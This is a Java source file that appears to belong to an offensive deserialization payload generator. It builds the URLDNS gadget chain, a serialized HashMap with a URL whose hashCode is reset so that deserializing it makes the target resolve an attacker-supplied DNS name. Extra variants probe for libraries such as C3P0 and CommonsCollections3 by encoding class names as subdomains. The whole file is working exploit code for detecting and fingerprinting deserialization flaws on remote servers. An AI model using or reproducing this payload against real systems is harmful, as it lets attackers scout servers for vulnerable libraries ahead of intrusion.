package com.ppp.chain.urldns;

import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import javassist.ClassPool;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * @author Whoopsunix
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */
@Sink({Sink.URLDNS})
@Dependencies()
@Authors()
public class URLDNS implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        DNSHelper dnsHelper = new DNSHelper();
        dnsHelper.setHost("");
        Product[] products = new Product[]{
                Product.C3P0,
                Product.CommonsCollections3,
        };

        dnsHelper.setProducts(products);

//        dnsHelper.setClassName("com.ppp.KickOffn");
//        dnsHelper.setSubdomain("ctf");

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setDnsHelper(dnsHelper);


        PayloadRunner.run(URLDNS.class, dnsHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        DNSHelper dnsHelper = sinksHelper.getDnsHelper();

        Object kickOffObject = getChainScheduler(dnsHelper);

        return kickOffObject;
    }

    public Object getChainScheduler(DNSHelper dnsHelper) throws Exception {
        Object kickOffObject = null;
        String host = dnsHelper.getHost();
        String className = dnsHelper.getClassName();
        String subdomain = dnsHelper.getSubdomain();


        if (host == null) {
            Printer.error("Host is empty");
        }

        Product[] products = dnsHelper.getProducts();
        if (products.length != 0) {
            List<Object> kickList = new LinkedList<Object>();
            for (Product product : products) {
                for (Subdomain subdomainEnum : Subdomain.values()) {
                    if (product == null)
                        continue;
                    if (subdomainEnum.getProduct().equals(product.getLongProduct())) {
                        String subdomainEnumSubdomain = subdomainEnum.getSubdomain();
                        String subdomainEnumClassName = subdomainEnum.getClassName();
                        try {
                            Class clazz = getClass(subdomainEnumClassName);
                            if (clazz != null) {
                                Object kick = getChain(hostFormat(host, subdomainEnumSubdomain), clazz);
                                kickList.add(kick);
                            }
                        } catch (Exception e) {

                        }
                        Printer.yellowInfo(String.format("Subdomain: %s  -->  Class: %s", subdomainEnumSubdomain, subdomainEnumClassName));
                    }
                }
            }
            kickOffObject = kickList;
        } else if (className != null) {
            Printer.yellowInfo(String.format("Subdomain: %s  -->  Custom Class: %s", subdomain, className));
            Class clazz = getClass(className);
            if (subdomain == null) {
                Printer.blueInfo("No subdomain specified, using host " + host);
            }
            kickOffObject = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
        } else {
            Printer.blueInfo("No product specified, using default URLDNS gadget");
            kickOffObject = getChain(hostFormat(host, null));
        }

        return kickOffObject;
    }


    /**
     * 原始
     *
     * @param url
     * @return
     * @throws Exception
     */
    public Object getChain(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        Reflections.setFieldValue(u, "hashCode", -1);

        return ht;
    }

    /**
     * 类探测
     *
     * @param url
     * @param cls
     * @return
     * @throws Exception
     */
    public Object getChain(String url, Class cls) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        ht.put(u, cls);

        Reflections.setFieldValue(u, "hashCode", -1);

        return ht;
    }

    public Class getClass(String className) {
        Class clazz = null;
        try {
            try {
                clazz = ClassPool.getDefault().makeClass(className).toClass();
            } catch (Exception e) {
                clazz = Class.forName(className);
            }
        } catch (Exception e) {

        }
        return clazz;
    }

    public String hostFormat(String host, String subdomain) {
        if (subdomain != null) {
            host = subdomain + "." + host;
        }
        // host 格式化
        if (!host.startsWith("http://") && !host.startsWith("https://")) {
            host = "http://" + host;
        }
        return host;
    }

    public static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
